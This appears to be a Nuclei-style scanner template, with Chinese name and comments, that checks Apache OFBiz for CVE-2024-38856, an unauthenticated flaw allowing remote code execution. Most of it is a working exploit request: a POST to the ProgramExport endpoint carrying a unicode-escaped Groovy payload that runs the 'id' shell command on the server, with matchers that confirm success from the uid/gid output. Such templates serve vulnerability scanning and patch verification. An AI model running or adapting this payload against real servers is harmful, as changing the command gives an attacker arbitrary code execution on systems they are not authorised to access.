script_name: Apache OFBiz 未授权不当代码执行
content:
id: Apache OFBiz 代码执行

info:
     name: CVE-2024-38856
     author: liu
     severity: high
     description: Apache OFBiz 18.12.14 has a command execution vulnerability from the ControlServlet and RequestHandler functions, which has an authorization error in processing requests, allowing an unauthenticated remote attacker to override the final rendered view by constructing a special URL. Thus executing arbitrary code
     reference: https://mp.weixin.qq.com/s/DINOEo1XmONphoF9KM9HMg
     tags: Apache

requests:
     - method: POST
       path:
            - '{{BaseURL}}/webtools/control/main/ProgramExport'
       headers:
        Content-Type: application/x-www-form-urlencoded
       body: 'groovyProgram= \u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b'
       matchers-condition: and
       matchers:
            - type: word
              words:
                   - "java.lang.Exception:"
                   - "uid="
                   - "gid="
                   - "groups="                               #如果检测到了请到代码里找到java.lang.Exception: uid=990(ofbiz) gid=990(ofbiz) groups=990(ofbiz)
            - type: status
              status:
                   - 200
